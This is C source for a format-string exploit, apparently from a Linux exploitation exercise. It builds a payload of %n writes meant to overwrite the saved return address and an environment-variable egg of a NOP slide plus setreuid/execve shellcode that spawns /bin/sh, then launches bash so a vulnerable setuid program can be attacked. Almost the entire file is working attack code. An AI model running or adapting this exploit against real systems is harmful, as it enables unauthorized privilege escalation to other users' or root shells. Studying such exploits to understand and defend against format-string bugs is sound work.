/* Exploit4 - Format String Exploit
 *
 * Try to overwrite %eip with the shellcode address in the 
 * Environment Variables. Usa PATH as base address
 * 
 * Write 0x0 ret_addr times and write ret_addr to %eip
 * seteuid()/execve() shellcode
 *
 * WARNING:
 * This exploit works, but it's extremely hard to get the 
 * ret addr right... stick with the next version that 
 * attempts to overwrite the .dtors section
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define DEFAULT_EGG_SIZE 4098
#define DEFAULT_PATH_OFFSET 512
#define DEFAULT_STACK_OFFSET 512
#define DEFAULT_STRING_OFFSET 8;
#define DEFAULT_UID 1001

char shellcode[] = 
  "\x55"
  "\x89\xe5"

  "\x31\xc0"
  "\x31\xdb"
  "\x31\xc9"
  "\xb0\x46"
  "\x66\xbb\xe9\x03" //adjust UID (0x03e9 = 1001)
  "\x66\xb9\xe9\x03" //adjust UID (0x03e9 = 1001)
  "\xcd\x80"

  "\x31\xc0"
  "\x50"
  "\x68\x2f\x2f\x73\x68"
  "\x68\x2f\x62\x69\x6e"
  "\x89\xe3"
  "\x31\xc9"
  "\x31\xd2"
  "\xb0\x0b"
  "\xcd\x80"
  ;

unsigned int get_path() {
  return (unsigned int) getenv("PATH");
}

int get_esp() {
  asm("mov %esp,%eax");
}

char* build_exploit(int path_offset, int stack_offset, int string_offset) {
  char* buffer;
  char* ret_array;
  char* p_buf;
  char* path_array;
  int path;
  int ret_addr;

  int printed = 0;
  int to_print;
  int padding;

  int i,j;

  buffer = p_buf = (char*) malloc(sizeof(char)*1024);

  ret_addr = get_esp() - stack_offset;
  ret_array = (char*) &ret_addr;

  printf("Using ret addr = %p\n",ret_addr);

  for (j=0;j<sizeof(int);j++) {
    for (i=0;i<sizeof(int);i++) {
      *p_buf = ret_array[i];
      p_buf++;
      
      if (i==3)ret_addr++;
    }
      p_buf += sprintf(p_buf,"AAAA");
  }

  printed += p_buf - buffer;

  for(i=0;i<string_offset;i++)
      p_buf += sprintf(p_buf,"%%08x");
  
  printed += string_offset*8;

  path = get_path() - path_offset;
  path_array = (char*) &path;

  printf("Using egg addr = %p\n",path);

  for (i=0;i<sizeof(int);i++) {
    to_print = ((int) path_array[i]) + 0x100;
    printed %= 0x100;
    padding = (to_print - printed) % 0x100;

    if (padding < 10) padding += 0x100;

    p_buf += sprintf(p_buf,"%%%uu%%n",padding);
    printed += padding;
  }  

  *p_buf = '\0';

  return buffer;
}

char* build_egg(int egg_size, unsigned int uid) {
  char* buffer;
  int shell_size;
  int i,j;

  buffer = (char*) malloc(sizeof(char)*egg_size);

  shell_size = sizeof(shellcode);

  /* NOP slide */
  for (i=0;i<egg_size - shell_size - 1;i++)
    buffer[i] = 0x90;

  /* Shellcode */
  if (uid == 0) {
    /*TODO Fix for uid = 0 */
    for (j=0;j<11;j++,i++)
      buffer[i] = shellcode[j];

    for (j+=8;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  } else {
    char* uid_array = (char*) &uid;
    shellcode[13] = uid_array[0];
    shellcode[14] = uid_array[1];

    shellcode[17] = uid_array[0];
    shellcode[18] = uid_array[1];

    for (j=0;j<shell_size;j++,i++)
      buffer[i] = shellcode[j];
  }
  
  return buffer;
}

int main(int argc, char* argv[]) {
  int path_offset;
  int stack_offset;
  int string_offset;
  int egg_size;
  unsigned int uid;

  char* exploit;
  char* egg;

  path_offset = argc > 1 ? atoi(argv[1]) : DEFAULT_PATH_OFFSET;
  stack_offset = argc > 2 ? atoi(argv[2]) : DEFAULT_STACK_OFFSET;
  string_offset = argc > 3 ? atoi(argv[3]) : DEFAULT_STRING_OFFSET;
  egg_size = argc > 4 ? atoi(argv[4]) : DEFAULT_EGG_SIZE;
  uid = argc > 5 ? atoi(argv[5]) : DEFAULT_UID;

  exploit = build_exploit(path_offset,stack_offset,string_offset);
  setenv("EXPLOIT",exploit,1);

  egg = build_egg(egg_size,uid);
  setenv("EGG",egg,1);

  system("/bin/bash");

  free(exploit);
  free(egg);
  
  return 0;
}
